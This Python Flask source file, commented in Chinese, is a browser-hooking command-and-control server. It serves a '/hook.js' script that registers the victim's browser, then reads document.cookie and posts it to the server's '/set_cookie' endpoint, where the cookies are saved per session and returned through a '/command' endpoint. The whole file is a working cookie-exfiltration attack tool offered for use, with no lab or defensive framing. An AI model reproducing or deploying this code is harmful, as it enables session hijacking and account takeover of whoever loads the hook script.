from flask import Flask, request, render_template, jsonify
import uuid
import datetime
import os
import logging
import json
from flask_cors import CORS
import urllib.parse

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
CORS(app)

sessions = {}
base_url = "http://192.168.0.189:5000"  #替换服务器的地址，本例中为192.168.0.189
cookie_dir = 'cookies'  #存储cookie文件的目录

#初始化日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

#创建 cookie 目录
if not os.path.exists(cookie_dir):
    os.makedirs(cookie_dir)

#定义命令处理函数
def get_cookie(session_id):
    cookie_file = os.path.join(cookie_dir, f"{session_id}.json")
    if os.path.exists(cookie_file):
        try:
            with open(cookie_file, 'r') as f:
                cookie_data = json.load(f)
            logging.info(f"Session {session_id}: Cookie read from file: {cookie_data}")
            return cookie_data
        except Exception as e:
            logging.error(f"Session {session_id}: Error reading cookie file: {e}")
            return "Error reading cookie file."
    else:
        logging.info(f"Session {session_id}: No cookie file found.")
        return "No cookie found."


commands = {
    "cookie": get_cookie,
}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/hook.js')
def hook():
    session_id = str(uuid.uuid4())
    hook_code = f'''
    fetch('{base_url}/hook_connect?session_id={session_id}', {{method: 'POST'}})
    .then(response => response.json())
    .then(data => {{
        const sessionId = data.session_id;
        console.log("sessionId from /hook_connect:",sessionId);
        fetch('{base_url}/heartbeat?session_id={session_id}', {{method: 'POST'}});
        setTimeout(() => {{
             console.log("document.cookie: ", document.cookie);
            fetch('{base_url}/set_cookie?session_id=' + sessionId, {{
              method: 'POST',
              headers: {{
                'Content-Type': 'application/json'
               }},
              body: JSON.stringify({{
                 cookie: document.cookie
               }})
              }});
          }}, 1000);
      }})
    '''
    return hook_code, 200, {'Content-Type': 'application/javascript'}

@app.route('/hook_connect', methods=['POST'])
def hook_connect():
    session_id = request.args.get('session_id')
    if session_id:
        sessions[session_id] = {
            'ip': request.remote_addr,
            'last_seen': datetime.datetime.now()
        }
        logging.info(f"New hook connected. Session ID: {session_id}, IP: {request.remote_addr}")
        logging.info(f"hook_connect return session_id: {session_id}")
        return jsonify({'session_id': session_id}), 200
    else:
        return jsonify({'error': 'Missing session ID'}), 400

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    session_id = request.args.get('session_id')
    if session_id and session_id in sessions:
        sessions[session_id]['last_seen'] = datetime.datetime.now()
        return jsonify({'status': 'ok'}), 200
    else:
        return jsonify({'error': 'Invalid session ID'}), 400

@app.route('/command', methods=['POST'])
def execute_command():
    session_id = request.json.get('session_id')
    command = request.json.get('command')
    if session_id and command and session_id in sessions:
         if command in commands:
             if command == "cookie":
                result = commands[command](session_id)
                return jsonify({'result': result}), 200
             else:
                 return jsonify({'error':'command error'}), 400
         else:
            return jsonify({'error':'command not found'}), 400
    else:
        return jsonify({'error': 'Invalid session ID or command'}), 400

@app.route('/set_cookie', methods=['POST'])
def set_cookie():
    session_id = request.args.get('session_id')
    cookie_data = request.json.get('cookie')
    logging.info(f"set_cookie request received: session_id={session_id}, cookie_data={cookie_data}")
    if not session_id:
        logging.error("set_cookie error: Missing session_id")
        return jsonify({'error': 'Missing session ID'}), 400
    if not cookie_data:
        logging.error("set_cookie error: Missing cookie data")
        return jsonify({'error': 'Missing cookie data'}), 400
    if session_id not in sessions:
        logging.error(f"set_cookie error: Invalid session_id {session_id}")
        return jsonify({'error': 'Invalid session ID'}), 400

    cookie_file = os.path.join(cookie_dir, f"{session_id}.json")
    try:
      with open(cookie_file, 'w') as f:
          json.dump(cookie_data,f)
      logging.info(f"Session {session_id}: Cookie saved to file: {cookie_file}")
      return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logging.error(f"Session {session_id}: Error saving cookie to file: {e}")
        return jsonify({'error': 'Error saving cookie'}), 500


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
